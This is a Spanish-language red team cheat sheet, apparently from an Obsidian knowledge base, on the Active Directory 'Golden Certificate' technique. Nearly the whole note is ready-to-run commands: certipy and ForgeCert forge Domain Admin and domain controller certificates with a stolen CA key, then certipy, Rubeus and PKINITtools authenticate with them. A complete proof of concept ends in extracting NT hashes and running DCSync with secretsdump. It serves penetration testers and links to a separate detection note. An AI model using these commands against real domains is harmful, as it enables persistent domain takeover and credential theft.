---
aliases:
  - Golden Certificate Forge
  - Forge Certificate
tags:
  - technique/persistence
  - technique/credential-access
  - asset/active-directory
  - env/windows
  - service/ad-cs
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Active Directory]]"
tertiary categories:
  - "[[Active Directory Explotación]]"
kind: SubCheatSheet
linked:
  - "[[Golden Certificate]]"
  - "[[UnPAC-the-hash]]"
---
# Golden Certificate - Forge y Auth

> Con la CA `.pfx` robada ([[Golden Certificate - CA Key Theft]]), forjás certs **offline** para cualquier identidad, sin tocar el DC ni la CA.

---

## Forjar el Certificado

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `certipy forge -ca-pfx corp-CA.pfx -upn administrator@corp.local` | Cert de DA firmado por la CA robada → `administrator.pfx` | Persistencia: forjar cuando quieras. |
| `certipy forge -ca-pfx corp-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=corp,DC=local'` | Cert con subject explícito | Si el mapeo requiere subject. |
| `certipy forge -ca-pfx corp-CA.pfx -upn dc01\$@corp.local -sid <DC_SID>` | Cert como cuenta máquina del DC (con SID, post-KB5014754) | Strong mapping enforced. |
| `ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword P --Subject "CN=User" --SubjectAltName administrator@corp.local --NewCertPath admin.pfx --NewCertPassword P` | Forja con ForgeCert (Windows) | Alternativa a certipy. |
^gc-forge-make

## Autenticar con el Cert Forjado

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `certipy auth -pfx administrator.pfx -dc-ip $IP` | TGT + **NT hash** del DA (UnPAC) → [[UnPAC-the-hash]] | Convertir cert en hash reutilizable. |
| `Rubeus.exe asktgt /user:administrator /certificate:admin.pfx /password:P /ptt` | TGT inyectado en la sesión | Acceso directo Windows. |
| `gettgtpkinit.py -cert-pfx admin.pfx corp.local/administrator admin.ccache` | TGT vía PKINIT (Linux, PKINITtools) | Workflow Linux manual. |
^gc-forge-auth

### PoC completo

```bash
# 1. Forjar cert de DA (offline, con la CA key robada)
certipy forge -ca-pfx corp-CA.pfx -upn administrator@corp.local
# 2. Autenticar → TGT + NT hash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
# 3. Usar el hash → DCSync
impacket-secretsdump -hashes :NTHASH corp.local/administrator@dc01
```

---

> Cómo lo detecta/mitiga el Blue Team: [[Golden Certificate - Detección y Mitigación]].
